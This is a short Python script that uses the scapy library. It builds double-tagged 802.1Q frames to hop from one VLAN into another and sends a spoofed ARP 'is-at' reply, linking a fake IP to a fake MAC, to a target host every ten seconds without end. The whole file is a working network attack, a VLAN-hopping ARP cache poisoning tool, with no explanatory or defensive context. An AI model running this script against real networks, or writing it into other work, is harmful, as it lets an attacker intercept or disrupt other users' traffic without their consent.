#! /usr/bin/python3

import sys
from scapy.all import *
from scapy.layers.l2 import *
from scapy.layers.inet import *

iface = "wlan0"
targetIP = "192.168.13.23"
fakeIP = "192.168.13.5"
fakeMAC = "c0:d3:de:ad:be:ef"
ourVLAN = 1
targetVLAN = 2

packet = Ether() / \
         Dot1Q(vlan=ourVLAN) / \
         Dot1Q(vlan=targetVLAN) / \
         ARP(hwsrc=fakeMAC, pdst=targetIP,
             psrc=fakeIP, op="is-at")


while True:
    sendp(packet, iface=iface)
    time.sleep(10)